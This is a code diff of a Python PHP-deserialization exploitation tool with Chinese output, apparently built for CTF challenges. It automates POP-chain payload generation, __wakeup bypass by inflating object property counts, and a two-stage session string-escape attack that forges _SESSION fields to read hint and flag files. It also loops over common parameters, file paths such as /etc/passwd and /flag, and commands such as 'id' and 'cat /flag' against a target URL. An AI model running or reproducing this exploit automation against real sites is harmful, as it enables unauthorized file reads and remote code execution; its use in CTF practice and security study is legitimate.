-                        req = urllib.request.Request(url, headers={
-                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
-                        })
-                        with urllib.request.urlopen(req, timeout=10) as response:
-                            result = response.read().decode('utf-8', errors='ignore')
-                    else:
-                        data = urllib.parse.urlencode({param_name: payload}).encode()
-                        req = urllib.request.Request(target_url, data=data, headers={
-                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-                            'Content-Type': 'application/x-www-form-urlencoded'
-                        })
-                        with urllib.request.urlopen(req, timeout=10) as response:
-                            result = response.read().decode('utf-8', errors='ignore')
-                    
-                    success_indicators = ['flag', 'ctf', 'NSSCTF', 'root:', 'total ', 'drwx', '-rw-', 'uid=', 'gid=', '/bin', '/etc', 'success']
-                    error_indicators = ['error', 'warning', 'fatal', 'exception', 'failed', 'invalid', 'denied', 'forbidden']
-                
-                    is_success = False
-                    result_lower = result.lower()
-                    
-                    for indicator in success_indicators:
-                        if indicator.lower() in result_lower:
-                            is_success = True
-                            break
-                    
-                    for indicator in error_indicators:
-                        if indicator in result_lower:
-                            is_success = False
+                logger.info(f"Trying payload {i} with method {current_method}")
+
+                success = False
+                result = None
+                last_error = None
+
+                for attempt in range(retry_count):
+                    try:
+                        headers = {
+                            'User-Agent': user_agents[attempt % len(user_agents)]
+                        }
+
+                        if current_method == 'GET':
+                            url = f"{target_url}?{param_name}={encoded_payload}"
+                            req = urllib.request.Request(url, headers=headers)
+                            with urllib.request.urlopen(req, timeout=timeout) as response:
+                                result = response.read().decode('utf-8', errors='ignore')
+                        else:
+                            data = urllib.parse.urlencode({param_name: payload}).encode()
+                            req = urllib.request.Request(target_url, data=data, headers={
+                                **headers,
+                                'Content-Type': 'application/x-www-form-urlencoded'
+                            })
+                            with urllib.request.urlopen(req, timeout=timeout) as response:
+                                result = response.read().decode('utf-8', errors='ignore')
+
+                        success = True
                         break
-                    
-                    has_content = len(result.strip()) > 0
-                    if has_content and not any(e in result_lower for e in error_indicators):
-                        is_success = True
-                    
-                    import re as re_check
-                    clean_result = re_check.sub(r'<[^>]+>', '', result)
-                    clean_result = re_check.sub(r'&[^;]+;', '', clean_result)
-                    
-                    has_flag = bool(
-                        re_check.search(r'NSSCTF\{[^}]+\}', result) or
-                        re_check.search(r'flag\{[^}]+\}', result, re.IGNORECASE) or
-                        re_check.search(r'ctf\{[^}]+\}', result, re.IGNORECASE) or
-                        re_check.search(r'\$flag\s*=', result) or
-                        ('flag' in clean_result.lower() and len(clean_result) < 500)
-                    )
-                    
+
+                    except urllib.error.HTTPError as e:
+                        last_error = f"HTTP {e.code}"
+                        logger.warn(f"HTTP Error {e.code} on attempt {attempt + 1}")
+                        if e.code in [500, 502, 503, 504]:
+                            time.sleep(retry_interval * (attempt + 1))
+                            continue
+                        break
+
+                    except urllib.error.URLError as e:
+                        last_error = f"URL Error: {e.reason}"
+                        logger.warn(f"URL Error: {e.reason} on attempt {attempt + 1}")
+
+                    except TimeoutError:
+                        last_error = "Timeout"
+                        logger.warn(f"Timeout on attempt {attempt + 1}")
+
+                    except Exception as e:
+                        last_error = str(e)
+                        logger.error(f"Unexpected error: {e}")
+
+                    if attempt < retry_count - 1:
+                        time.sleep(retry_interval * (attempt + 1))
+
+                if not success:
                     res_dict = {
                         'payload_index': i,
                         'payload': payload,
                         'method': current_method,
-                        'response': result,
-                        'success': is_success,
-                        'has_flag': has_flag
+                        'error': last_error,
+                        'success': False,
+                        'has_flag': False,
+                        'response': ''
                     }
-                    log_file.write(f"Payload {i} ({current_method}):\n{payload}\nResponse:\n{result}\n\n")
                     results.append(res_dict)
-                    
-                    if is_success:
-                        break
-                    
-                except urllib.error.HTTPError as e:
-                    results.append({
-                        'payload_index': i,
-                        'payload': payload,
-                        'method': current_method,
-                        'error': f"HTTP {e.code}",
-                        'success': False,
-                        'has_flag': False
-                    })
-                except Exception as e:
-                    results.append({
-                        'payload_index': i,
-                        'payload': payload,
-                        'method': current_method,
-                        'error': str(e),
-                        'success': False,
-                        'has_flag': False
-                    })
-        
-        log_file.close()
+                    continue
+
+                analysis = response_analyzer.analyze_response(result)
+
+                res_dict = {
+                    'payload_index': i,
+                    'payload': payload,
+                    'method': current_method,
+                    'response': result,
+                    'success': analysis['has_flag'] or (analysis['quality_score'] > 0.5 and not analysis['is_fake_success']),
+                    'has_flag': analysis['has_flag'],
+                    'flag_value': analysis['flag_value'],
+                    'quality_score': analysis['quality_score'],
+                    'is_fake_success': analysis['is_fake_success'],
+                    'clean_response': analysis['clean_response']
+                }
+                logger.info(f"Result: has_flag={analysis['has_flag']}, quality={analysis['quality_score']:.2f}, fake={analysis['is_fake_success']}")
+                logger.debug(f"Response preview: {analysis['clean_response'][:100]}...")
+
+                results.append(res_dict)
+
+                if analysis['has_flag']:
+                    logger.info(f"*** FLAG FOUND: {analysis['flag_value']} ***")
+                    break
+
+                if res_dict['success']:
+                    break
+
+            if res_dict.get('has_flag'):
+                break
+
+        logger.section('Exploitation Finished')
+        success_count = sum(1 for r in results if r.get('success'))
+        flag_count = sum(1 for r in results if r.get('has_flag'))
+        logger.info(f"Total: {len(results)} attempts, {success_count} success, {flag_count} flags found")
+
         return results
     
     def analyze(self) -> dict:
         chains = self.chain_builder.build_all_chains() if self.chain_builder else []
         self.payload_generator = SmartPayloadGenerator(self.classes, chains)
-        
+
+        session_escape_result = {}
+        if self.session_escape_detector:
+            session_escape_result = self.session_escape_detector.analyze()
+
         return {
             'classes': self.classes,
-            'chains': chains
+            'chains': chains,
+            'session_escape': session_escape_result
         }
-    
+
+    def exploit_session_escape(self, target_url: str, payloads: List[dict],
+                                timeout: int = 10, retry_count: int = 3) -> dict:
+        import urllib.request
+        import urllib.parse
+        import urllib.error
+        import time
+
+        logger = Logger('exploit_log.txt')
+        logger.section('Session字符串逃逸利用')
+
+        response_analyzer = ResponseAnalyzer()
+        results = []
+
+        for i, payload_info in enumerate(payloads, 1):
+            method = payload_info.get('method', 'unknown')
+
+            if method == 'session_string_escape':
+                post_data = payload_info.get('POST', {})
+                get_params = payload_info.get('GET', {})
+                target_file = payload_info.get('target_file', 'unknown')
+                description = payload_info.get('description', '')
+
+                logger.info(f"Payload {i}: {description}")
+
+                get_url = target_url
+                if get_params:
+                    get_query = urllib.parse.urlencode(get_params)
+                    get_url = f"{target_url}?{get_query}" if '?' not in target_url else f"{target_url}&{get_query}"
+
+                post_data_encoded = urllib.parse.urlencode(post_data).encode()
+
+                for attempt in range(retry_count):
+                    try:
+                        req = urllib.request.Request(
+                            get_url,
+                            data=post_data_encoded,
+                            headers={
+                                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+                                'Content-Type': 'application/x-www-form-urlencoded'
+                            }
+                        )
+
+                        with urllib.request.urlopen(req, timeout=timeout) as response:
+                            result = response.read().decode('utf-8', errors='ignore')
+
+                        analysis = response_analyzer.analyze_response(result)
+
+                        res_dict = {
+                            'payload_index': i,
+                            'payload': payload_info,
+                            'response': result,
+                            'has_flag': analysis['has_flag'],
+                            'flag_value': analysis['flag_value'],
+                            'has_hint': analysis['has_hint'],
+                            'hint_value': analysis['hint_value'],
+                            'quality_score': analysis['quality_score'],
+                            'description': description,
+                            'method': method
+                        }
+
+                        results.append(res_dict)
+
+                        if analysis['has_flag']:
+                            logger.info(f"*** FLAG FOUND: {analysis['flag_value']} ***")
+                            return res_dict
+
+                        if analysis['has_hint']:
+                            logger.info(f"[!] 发现提示: {analysis['hint_value']}")
+
+                        break
+
+                    except urllib.error.HTTPError as e:
+                        logger.warn(f"HTTP Error {e.code} on attempt {attempt + 1}")
+                        if attempt < retry_count - 1:
+                            time.sleep(1 * (attempt + 1))
+
+                    except Exception as e:
+                        logger.error(f"Error: {e}")
+                        break
+
+        logger.section('利用完成')
+        return results[-1] if results else {'success': False}
+
     def auto_generate_payloads(self, cmd: str = "id", file: str = "/flag") -> List[dict]:
         if not self.payload_generator:
             return []
@@ -1207,13 +1826,13 @@ class PHPUnserializeTool:
         
         return payload
     
-    def print_analysis(self):
+    def print_analysis(self, raw_code: str = None):
         result = self.analyze()
-        
+
         print("\n" + "="*70)
         print("  PHP反序列化漏洞智能分析报告")
         print("="*70)
-        
+
         print(f"\n[*] 发现 {len(result['classes'])} 个类:")
         for php_class in result['classes']:
             print(f"\n  ┌─ 类: {php_class.name}")
@@ -1228,8 +1847,29 @@ class PHPUnserializeTool:
                     magic_tag = " [魔术方法]" if method.is_magic else ""
                     print(f"  │    {method.visibility.value} {method.name}(){magic_tag}")
             print(f"  └─")
-        
+
         chains = result['chains']
+
+        if 'session_escape' in result and result['session_escape']:
+            session_escape = result['session_escape']
+            if session_escape.get('has_vulnerability'):
+                print("\n" + "="*70)
+                print("  [!] 检测到Session字符串逃逸漏洞")
+                print("="*70)
+                print(f"\n  [+] 漏洞类型: Session反序列化字符串逃逸")
+                print(f"  [+] 过滤关键词: {', '.join(session_escape.get('filters', []))}")
+                print(f"  [+] 利用方法: filter长度减少导致字符串逃逸")
+                print(f"  [+] extract()变量覆盖: {'是' if session_escape.get('extract_post') else '否'}")
+                print(f"  [+] Session序列化: {'是' if session_escape.get('serialize_session') else '否'}")
+
+                payloads = session_escape.get('payloads', [])
+                if payloads:
+                    print(f"\n  [+] 可用Payload数量: {len(payloads)}")
+                    print("\n  推荐Payload示例:")
+                    for p in payloads[:5]:
+                        if isinstance(p, dict) and 'description' in p:
+                            print(f"    - {p['description']}")
+
         if chains:
             print("\n" + "="*70)
             print("  [!] 发现可利用的POP链")
@@ -1239,18 +1879,43 @@ class PHPUnserializeTool:
                 entry = chain['entry']
                 entry_class = entry['class'].name if hasattr(entry['class'], 'name') else entry['class']
                 entry_method = entry['method'].name if hasattr(entry['method'], 'name') else entry['method']
-                
+
                 print(f"\n  链 {i}: [{chain['type'].upper()}]")
                 print(f"    入口: {entry_class}::{entry_method}")
                 print(f"    危险函数: {sink['function']}()")
                 print(f"    利用类型: {chain['type']}")
-                
+
                 prop_chain = chain.get('prop_chain', [])
                 if prop_chain:
                     chain_str = ' -> '.join([link['to_class'] for link in prop_chain])
                     print(f"    调用链: {entry_class} -> {chain_str}")
         else:
             print("\n[!] 未发现明显的POP链")
+
+        if HAS_PATTERN_DETECTOR and raw_code:
+            print("\n" + "="*70)
+            print("  无类漏洞模式检测")
+            print("="*70)
+
+            detector = PatternDetector(raw_code)
+            patterns = detector.detect_all()
+
+            if patterns:
+                for pattern in patterns:
+                    print(f"\n  [VULN] {pattern.vuln_type.value.upper()}")
+                    print(f"        置信度: {pattern.confidence:.0%}")
+                    print(f"        {pattern.description}")
+                    print(f"        位置: {pattern.location}")
+
+                    if hasattr(pattern, 'payloads') and pattern.payloads:
+                        print(f"        推荐Payload:")
+                        for payload in pattern.payloads[:3]:
+                            if len(payload) > 60:
+                                print(f"          {payload[:60]}...")
+                            else:
+                                print(f"          {payload}")
+            else:
+                print("\n  [-] 未检测到无类漏洞模式")
     
     def print_auto_payloads(self, cmd: str = "id", file: str = "/flag"):
         payloads = self.auto_generate_payloads(cmd, file)
@@ -1388,35 +2053,197 @@ def main():
     print("="*70)
     print("  PHP反序列化一键利用工具")
     print("="*70)
-    
+
     source = args.file if args.file else args.target
     print(f"\n[*] 加载PHP源码: {source}")
-    
+
+    raw_code = None
     if tool.is_url(source):
         tool.load_php_url(source)
+        if args.file:
+            with open(args.file, 'r', encoding='utf-8') as f:
+                raw_code = f.read()
     else:
         tool.load_php_file(source)
-    
-    tool.print_analysis()
-    
+        with open(source, 'r', encoding='utf-8') as f:
+            raw_code = f.read()
+
+    tool.print_analysis(raw_code)
+
     result = tool.analyze()
-    if not result['chains']:
-        print("\n[-] 未发现可利用的POP链")
+
+    has_filter_bypass = False
+    bypass_payloads = []
+    if HAS_PATTERN_DETECTOR and raw_code:
+        detector = PatternDetector(raw_code)
+        patterns = detector.detect_all()
+        for pattern in patterns:
+            if pattern.vuln_type.value == 'filter_bypass':
+                has_filter_bypass = True
+                bypass_payloads = pattern.payloads
+                break
+
+    if not result['chains'] and not has_filter_bypass:
+        print("\n[-] 未发现可利用的POP链，也未检测到无类漏洞模式")
         return
-    
+
+    if not result['chains'] and has_filter_bypass:
+        print("\n[!] 未发现POP链，但检测到Filter Bypass漏洞模式")
+        print("\n" + "="*70)
+        print("  Filter Bypass Payload 生成")
+        print("="*70)
+
+        filters = []
+        if HAS_PATTERN_DETECTOR and raw_code:
+            detector = PatternDetector(raw_code)
+            patterns = detector.detect_all()
+            for pattern in patterns:
+                if hasattr(pattern, 'details') and 'filters' in pattern.details:
+                    filters = pattern.details['filters']
+                    break
+
+        if filters:
+            from filter_bypass import FilterBypassPayloadGenerator
+            gen = FilterBypassPayloadGenerator(filters)
+            all_payloads = gen.generate_all_payloads()
+
+            print(f"\n[*] 过滤关键词: {', '.join(filters)}")
+            print(f"[*] 生成绕过Payload数量: {len(all_payloads)}")
+
+            if all_payloads:
+                print("\n[*] 绕过Payload示例:")
+                for p in all_payloads[:10]:
+                    print(f"    {p.get('method', 'unknown')}: {p['payload'][:60]}...")
+        else:
+            print("\n[*] 使用检测到的Payload:")
+            for i, payload in enumerate(bypass_payloads[:10], 1):
+                print(f"    [{i}] {payload}")
+
+        user_continue = input("\n[?] 是否尝试利用这些Payload? (y/n): ").strip().lower()
+        if user_continue != 'y':
+            return
+
     has_rce = any(c['type'] == 'rce' for c in result['chains'])
     has_file_read = any(c['type'] == 'file_read' for c in result['chains'])
-    has_wakeup = any('__wakeup' in str(c) for c in result['chains'])
-    
+    has_wakeup_entry = any(
+        c.get('entry', {}).get('method', '') == '__wakeup' or
+        (hasattr(c.get('entry', {}).get('method', ''), 'name') and c['entry']['method'].name == '__wakeup')
+        for c in result['chains']
+    )
+
+    has_session_escape = (
+        'session_escape' in result and
+        result['session_escape'] and
+        result['session_escape'].get('has_vulnerability', False)
+    )
+
     print("\n" + "="*70)
     print("  自动利用")
     print("="*70)
-    
-    common_params = ['ser', 'data', 'payload', 'x', 'str', 'input', 'var', 'p']
-    common_files = ['/flag', '/flag.txt', 'flag.php', 'fllllllag.php', '/etc/passwd', 'flag']
+
+    common_params = ['ser', 'data', 'payload', 'x', 'str', 'input', 'var', 'p', 'f']
+    common_files = ['/flag', '/flag.txt', 'flag.php', 'fllllllag.php', '/etc/passwd', 'flag', 'show_image']
     common_cmds = ['id', 'ls', 'cat /flag', 'ls /']
-    
-    if args.param:
+
+    bypass_mode = has_filter_bypass and not result['chains'] and not has_session_escape
+    filter_bypass_gen = None
+    params_to_try = common_params
+
+    found_flag = False
+
+    if has_session_escape:
+        print(f"\n[!] 漏洞类型: SESSION_STRING_ESCAPE (Session字符串逃逸)")
+        session_escape = result['session_escape']
+        print(f"[*] 检测到Session字符串逃逸漏洞")
+        print(f"[*] 过滤关键词: {', '.join(session_escape.get('filters', []))}")
+
+        escape_payloads = session_escape.get('payloads', [])
+        if escape_payloads:
+            print(f"[*] 生成绕过Payload数量: {len(escape_payloads)}")
+
+            two_stage_payloads = tool.session_escape_detector.generate_two_stage_payloads() if tool.session_escape_detector else []
+
+            if two_stage_payloads:
+                print(f"[*] 检测到可能的两阶段文件读取，开始自动利用...")
+
+                for two_stage in two_stage_payloads:
+                    stage1 = two_stage['stage1']
+                    stage2 = two_stage['stage2']
+
+                    print(f"\n[*] {stage1['description']}")
+                    result1 = tool.exploit_session_escape(args.target, [stage1])
+
+                    if result1.get('has_hint') and result1.get('hint_value'):
+                        hint_file = result1['hint_value']
+                        print(f"\n[!] 获取到提示文件: {hint_file}")
+                        print(f"[*] 正在读取真正flag...")
+
+                        encoded_hint = base64.b64encode(hint_file.encode()).decode()
+                        hint_escaped = '";s:3:"img";s:' + str(len(encoded_hint)) + ':"' + encoded_hint + '";s:1:"1";s:1:"2";}'
+                        stage2_payload = {
+                            'POST': {
+                                '_SESSION[user]': 'flagflagflagflagflagphp',
+                                '_SESSION[function]': hint_escaped
+                            },
+                            'GET': {'f': 'show_image'},
+                            'method': 'session_string_escape',
+                            'target_file': hint_file,
+                            'description': f'第二阶段:读取{hint_file}'
+                        }
+
+                        result2 = tool.exploit_session_escape(args.target, [stage2_payload])
+
+                        if result2.get('has_flag'):
+                            print(f"\n\n{'='*70}")
+                            print(f"  [!!!] 发现FLAG!")
+                            print(f"{'='*70}")
+                            print(f"\n[!!!] FLAG: {result2['flag_value']}")
+                            found_flag = True
+                            break
+
+            if not found_flag:
+                print(f"\n[*] 开始普通Session字符串逃逸利用...")
+                for payload_info in escape_payloads[:20]:
+                    if found_flag:
+                        break
+
+                    result = tool.exploit_session_escape(args.target, [payload_info])
+
+                    if result.get('has_flag'):
+                        print(f"\n\n{'='*70}")
+                        print(f"  [!!!] 发现FLAG!")
+                        print(f"{'='*70}")
+                        print(f"\n[!!!] FLAG: {result['flag_value']}")
+                        found_flag = True
+                        break
+
+                    if result.get('has_hint'):
+                        print(f"\n[!] 获取到提示: {result.get('hint_value')}")
+
+        if found_flag:
+            return
+
+    if bypass_mode:
+        print(f"\n[!] 漏洞类型: FILTER_BYPASS (过滤器绕过)")
+        print(f"[*] 生成绕过Payload用于Session反序列化")
+
+        if HAS_PATTERN_DETECTOR and raw_code:
+            detector = PatternDetector(raw_code)
+            patterns = detector.detect_all()
+            for pattern in patterns:
+                if pattern.vuln_type.value == 'filter_bypass':
+                    filters = pattern.details.get('filters', [])
+                    from filter_bypass import FilterBypassPayloadGenerator, SessionSerializeExploiter
+                    filter_bypass_gen = FilterBypassPayloadGenerator(filters)
+                    break
+
+        files_to_try = ['show_image', 'highlight_file', 'phpinfo', 'fl3g', 'fl4g']
+        cmds_to_try = [None]
+        if not args.file_read:
+            files_to_try = [f for f in common_files if f != '/etc/passwd']
+        else:
+            files_to_try = [args.file_read]
+    elif args.param:
         params_to_try = [args.param]
     else:
         params_to_try = common_params
@@ -1455,62 +2282,95 @@ def main():
     
     print(f"\n[*] 尝试参数: {', '.join(params_to_try)}")
     print(f"[*] 请求方法: {args.method}")
-    if has_wakeup:
+    if has_wakeup_entry:
         print("[*] 自动绕过__wakeup")
-    
+
     all_results = []
     found_flag = False
-    
+
     import re
-    
+
     for file_path in files_to_try:
         if found_flag:
             break
         for cmd in cmds_to_try:
             if found_flag:
                 break
-            
-            payloads = tool.auto_generate_payloads(cmd or "id", file_path or "/flag")
-            
+
+            if bypass_mode and filter_bypass_gen:
+                payloads = []
+                bypass_all = filter_bypass_gen.generate_all_payloads()
+
+                base_serial = 'a:3:{s:4:"user";s:5:"guest";s:8:"function";s:10:"show_image";s:3:"img";s:18:"Z3Vlc3RfaW1nLnBuZw==";}'
+
+                for func_val in files_to_try:
+                    for byp in bypass_all[:5]:
+                        test_serial = base_serial.replace('show_image', func_val)
+                        new_serial = byp['payload'].replace(
+                            'show_image',
+                            func_val
+                        ) if 'show_image' in byp['payload'] else test_serial
+
+                        if new_serial != base_serial:
+                            payloads.append({
+                                'payload': new_serial,
+                                'type': 'filter_bypass',
+                                'class': 'Session',
+                                'chain': {}
+                            })
+                        else:
+                            final_serial = base_serial.replace(by_dict.get('keyword', 'flag'),
+                                by_dict.get('bypass', 'fl3g')) if 'keyword' in by_dict else base_serial
+                            for kw, bp in [('flag', 'fl3g'), ('php', 'pphphp')]:
+                                final_serial = final_serial.replace(kw, bp)
+                            payloads.append({
+                                'payload': final_serial,
+                                'type': 'filter_bypass',
+                                'class': 'Session',
+                                'chain': {}
+                            })
+
+                by_dict = {}
+                for byp in bypass_all[:3]:
+                    if 'keyword' in byp:
+                        by_dict = byp
+                        break
+
+                for func_val in ['show_image', 'highlight_file', 'phpinfo']:
+                    for kw, bp in [('flag', 'fl3g'), ('php', 'pphphp')]:
+                        test_payload = base_serial.replace('show_image', func_val)
+                        test_payload = test_payload.replace('flag', bp)
+                        test_payload = test_payload.replace('php', bp)
+                        payloads.append({
+                            'payload': test_payload,
+                            'type': 'filter_bypass',
+                            'class': 'Session',
+                            'chain': {}
+                        })
+            else:
+                payloads = tool.auto_generate_payloads(cmd or "id", file_path or "/flag")
+
             if args.code:
                 for p in payloads:
                     p['payload'] = tool._inject_custom_code(p['payload'], args.code)
-            
-            for p in payloads:
-                p['payload'] = re.sub(r'(O:\d+:"[^"]+":)(\d+)', 
-                                     lambda m: f"{m.group(1)}999", p['payload'])
-            
+
+            if has_wakeup_entry:
+                for p in payloads:
+                    p['payload'] = re.sub(r'(O:\d+:"[^"]+":)(\d+)',
+                                         lambda m: f"{m.group(1)}999", p['payload'])
+
             for param_name in params_to_try:
                 if found_flag:
                     break
-                
+
                 print(f"\r[*] 尝试: 参数={param_name}, 文件={file_path}, 命令={cmd}    ", end="", flush=True)
-                
+
                 results = tool.auto_exploit(args.target, payloads, param_name, args.method)
-                
+
                 for r in results:
                     all_results.append(r)
-                    response = r.get('response', '')
-                    
-                    clean_response = re.sub(r'<[^>]+>', '', response)
-                    clean_response = re.sub(r'//.*', '', clean_response)
-                    clean_response = re.sub(r'/\*.*?\*/', '', clean_response, flags=re.DOTALL)
-                    
-                    flag_patterns = [
-                        r'NSSCTF\{[^}]+\}',
-                        r'flag\{[^}]+\}',
-                        r'ctf\{[^}]+\}',
-                        r'FLAG\{[^}]+\}'
-                    ]
-                    
-                    found_flag_pattern = None
-                    for pattern in flag_patterns:
-                        match = re.search(pattern, response, re.IGNORECASE)
-                        if match:
-                            found_flag_pattern = match.group()
-                            break
-                    
-                    if found_flag_pattern:
+
+                    if r.get('has_flag') and r.get('flag_value'):
                         found_flag = True
                         print(f"\n\n{'='*70}")
                         print(f"  [!!!] 发现FLAG!")
@@ -1521,43 +2381,52 @@ def main():
                         if cmd:
                             print(f"[命令]: {cmd}")
                         print(f"[Payload]: {r['payload']}")
-                        print(f"\n[!!!] FLAG: {found_flag_pattern}")
+                        print(f"\n[!!!] FLAG: {r['flag_value']}")
                         break
-                    
-                    if r.get('success') and len(clean_response.strip()) > 50:
-                        if 'class' not in clean_response.lower()[:200]:
+
+                    if r.get('success') and r.get('quality_score', 0) > 0.5 and not r.get('is_fake_success'):
+                        clean_response = r.get('clean_response', '')
+                        if len(clean_response) > 50 and 'class' not in clean_response.lower()[:200]:
                             print(f"\n\n{'='*70}")
-                            print(f"  [+] 成功获取响应!")
+                            print(f"  [+] 成功获取有价值的响应!")
                             print(f"{'='*70}")
                             print(f"\n[参数]: {param_name}")
                             if file_path:
                                 print(f"[文件]: {file_path}")
                             print(f"[Payload]: {r['payload']}")
+                            print(f"[质量评分]: {r.get('quality_score', 0):.2f}")
                             print(f"\n[响应]: {clean_response[:500]}")
                             break
-                
+
                 if found_flag:
                     break
-    
+
     print()
-    
+
     if not found_flag and all_results:
         print(f"\n{'='*70}")
         print("  利用结果")
         print(f"{'='*70}")
-        
+
         success_count = sum(1 for r in all_results if r.get('success'))
+        flag_count = sum(1 for r in all_results if r.get('has_flag'))
+        quality_sum = sum(r.get('quality_score', 0) for r in all_results)
         print(f"\n[*] 总计: {len(all_results)} 次尝试")
         print(f"[*] 成功: {success_count} 次")
-        
-        for r in all_results:
-            if r.get('success'):
-                print(f"\n[+] 成功Payload: {r['payload'][:100]}...")
-                response = r.get('response', '')
-                if len(response) < 500:
-                    print(f"[+] 响应: {response}")
-                break
-    
+        print(f"[*] 发现Flag: {flag_count} 次")
+        print(f"[*] 平均内容质量: {quality_sum / len(all_results):.2f}")
+
+        high_quality_results = [r for r in all_results if r.get('quality_score', 0) > 0.3]
+        if high_quality_results:
+            print(f"\n[*] 高质量响应 ({len(high_quality_results)}个):")
+            for r in high_quality_results[:5]:
+                print(f"    - 质量:{r.get('quality_score', 0):.2f} 长度:{len(r.get('response', ''))} fake:{r.get('is_fake_success', False)}")
+
+        best_result = max(all_results, key=lambda r: r.get('quality_score', 0)) if all_results else None
+        if best_result and best_result.get('quality_score', 0) > 0.1 and not best_result.get('is_fake_success'):
+            print(f"\n[+] 最佳Payload: {best_result['payload'][:80]}...")
+            print(f"[+] 响应质量: {best_result.get('quality_score', 0):.2f}")
+
     if not all_results:
         print("\n[-] 利用失败，请检查目标URL")
 
